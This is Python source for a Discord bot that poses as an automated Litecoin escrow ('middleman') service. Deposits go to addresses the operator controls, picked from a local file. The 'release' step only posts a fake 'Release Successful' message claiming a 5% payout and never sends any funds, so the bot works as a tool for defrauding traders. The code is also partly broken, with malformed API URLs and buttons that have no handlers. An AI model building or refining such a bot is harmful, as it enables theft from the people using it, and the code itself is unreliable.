import discord
from discord.ext import commands
import json
import random
import requests

# Load config
with open("config.json", "r") as f:
    config = json.load(f)

# Initialize bot
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# Global data
category_id = config["CATEGORY_ID"]
developer_ids = config["DEVELOPER_IDS"]
embed_color = config["EMBED_COLOR"]

channel_data = {}  # Stores channel-specific info like roles, amount, txid


@bot.event
async def on_ready():
    print(f"Logged in as {bot.user.name}")
    await bot.change_presence(activity=discord.Game(name="Auto MM"))


@bot.event
async def on_guild_channel_create(channel):
    if isinstance(channel, discord.TextChannel) and channel.category_id == category_id:
        code = "".join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=24))
        await channel.send(f"```{code}```")
        await channel.send("Please send the **Developer ID** of the user you are dealing with.")


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if isinstance(message.channel, discord.TextChannel) and message.channel.category_id == category_id:
        await handle_channel_messages(message)


async def handle_channel_messages(message):
    channel = message.channel
    author = message.author

    if channel.id not in channel_data:
        channel_data[channel.id] = {
            "users": [],
            "roles": {},
            "amount": None,
            "txid": None,
            "confirmed": {}
        }

    # Developer ID check
    try:
        dev_id = int(message.content.strip())
        if dev_id in developer_ids:
            added_user = bot.get_user(dev_id)
            if not added_user:
                await channel.send("User not found.")
                return

            await channel.send(f"{added_user.mention} has been added to the ticket!")
            channel_data[channel.id]["users"].append(added_user.id)

            # Send Crypto MM embed
            embed = discord.Embed(title="Crypto MM", description="Welcome to our automated cryptocurrency Middleman system!", color=0x00ff00)
            embed.set_footer(text="Created by: Exploit")
            await channel.send(embed=embed)

            # Warning embed
            embed = discord.Embed(title="Please Read!", description="Ensure all deal conversations happen here.", color=0xff0000)
            await channel.send(embed=embed)

            await send_role_selection(channel)

    except ValueError:
        pass  # Skip if message isn't a valid dev ID

    if message.content.lower() in ["sending", "receiving"]:
        role = "Sender" if message.content.lower() == "sending" else "Receiver"
        channel_data[channel.id]["roles"][message.author.id] = role
        await update_role_selection(channel)

        if len(channel_data[channel.id]["roles"]) == 2:
            await send_confirmation(channel)

    elif message.content.isdigit() or '.' in message.content:
        try:
            amount = float(message.content)
            channel_data[channel.id]["amount"] = amount

            await channel.send(f"{message.author.mention} confirmed amount: ✅")

            await send_payment_invoice(channel)
        except ValueError:
            await channel.send("Invalid amount.")

    elif message.content.lower() == "transaction detected":
        api_key = open("apikey.txt").readline().strip()
        ltc_address = random.choice(open("ltcaddy.txt").readlines()).strip()

        tx_data = await check_ltc_transaction(api_key, ltc_address)

        if tx_data["success"]:
            channel_data[channel.id]["txid"] = tx_data["txid"]
            await channel.send("✅ Payment received.")
            await send_release_confirmation(channel)
        else:
            await channel.send("⚠️ Payment not detected yet.")

    elif message.content.lower() == "release":
        receiver = next((u for u, r in channel_data[channel.id]["roles"].items() if r == "Receiver"), None)
        sender = next((u for u, r in channel_data[channel.id]["roles"].items() if r == "Sender"), None)

        if not receiver:
            return

        await channel.send(f"<@{receiver}> Please send your LTC address to receive 5% of the amount.")

        def check(m):
            return m.author == bot.get_user(receiver) and m.channel == channel

        ltc_address = await bot.wait_for("message", check=check)
        amount = channel_data[channel.id]["amount"]
        reward_amount = amount * 0.05  # 5%

        embed = discord.Embed(title="Release Successful", color=0x00ff00)
        embed.add_field(name="Address", value=f"`{ltc_address.content}`", inline=False)
        embed.add_field(name="TXID", value=f"`{channel_data[channel.id]['txid']}`", inline=False)
        embed.add_field(name="You Received", value=f"${reward_amount}", inline=False)
        await channel.send(embed=embed)

        embed = discord.Embed(title="Deal Completed", description="Thank you for using the auto middleman service.", color=0x00ff00)
        await channel.send(embed=embed)


async def send_role_selection(channel):
    embed = discord.Embed(title="Role Selection", description="Select your role:", color=0x00ffff)
    embed.add_field(name="Sending Litecoin (Buyer)", value="None", inline=False)
    embed.add_field(name="Receiving Litecoin (Seller)", value="None", inline=False)

    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Sending", custom_id="sending"))
    view.add_item(discord.ui.Button(label="Receiving", custom_id="receiving"))
    view.add_item(discord.ui.Button(label="Reset", style=discord.ButtonStyle.danger, custom_id="reset"))

    await channel.send(embed=embed, view=view)


async def update_role_selection(channel):
    embed = discord.Embed(title="Role Selection", description="Select your role:", color=0x00ffff)
    roles = channel_data[channel.id]["roles"]
    sender = next((u for u, r in roles.items() if r == "Sender"), None)
    receiver = next((u for u, r in roles.items() if r == "Receiver"), None)

    embed.add_field(name="Sending Litecoin (Buyer)", value=f"<@{sender}>" if sender else "None", inline=False)
    embed.add_field(name="Receiving Litecoin (Seller)", value=f"<@{receiver}>" if receiver else "None", inline=False)

    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Sending", custom_id="sending"))
    view.add_item(discord.ui.Button(label="Receiving", custom_id="receiving"))
    view.add_item(discord.ui.Button(label="Reset", style=discord.ButtonStyle.danger, custom_id="reset"))

    await channel.send(embed=embed, view=view)


async def send_confirmation(channel):
    embed = discord.Embed(title="Confirmation", description="Confirm deal details below:", color=0x00ff00)
    roles = channel_data[channel.id]["roles"]
    sender = next((u for u, r in roles.items() if r == "Sender"), None)
    receiver = next((u for u, r in roles.items() if r == "Receiver"), None)

    embed.add_field(name="Sender", value=f"<@{sender}>", inline=False)
    embed.add_field(name="Receiver", value=f"<@{receiver}>", inline=False)

    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Correct", style=discord.ButtonStyle.green, custom_id="correct"))
    view.add_item(discord.ui.Button(label="Incorrect", style=discord.ButtonStyle.red, custom_id="incorrect"))

    await channel.send(embed=embed, view=view)


async def send_payment_invoice(channel):
    amount = channel_data[channel.id]["amount"]
    ltc_address = random.choice(open("ltcaddy.txt").readlines()).strip()

    embed = discord.Embed(title="Payment Invoice", description="Send full amount to this address:", color=0x00ff00)
    embed.add_field(name="Litecoin Address", value=f"`{ltc_address}`", inline=False)
    embed.add_field(name="Amount", value=f"${amount}", inline=True)

    view = discord.ui.View(timeout=None)
    view.add_item(discord.ui.Button(label="Paste", custom_id="paste"))
    view.add_item(discord.ui.Button(label="Scan QR", custom_id="qr"))

    await channel.send(embed=embed, view=view)


async def check_ltc_transaction(api_key, address):
    url = f"https://api.blockcypher.com/v1/ltc/main/addrs/ {address}/balance?token={api_key}"
    
    try:
        response = requests.get(url)
        data = response.json()
        
        if data["balance"] > 0:
            tx_url = f"https://api.blockcypher.com/v1/ltc/main/addrs/ {address}/full?token={api_key}"
            tx_response = requests.get(tx_url)
            tx_data = tx_response.json()

            if tx_data.get("txs"):
                txid = tx_data["txs"][0]["hash"]
                return {"success": True, "txid": txid}
        
        return {"success": False}
    
    except Exception as e:
        return {"success": False, "error": str(e)}
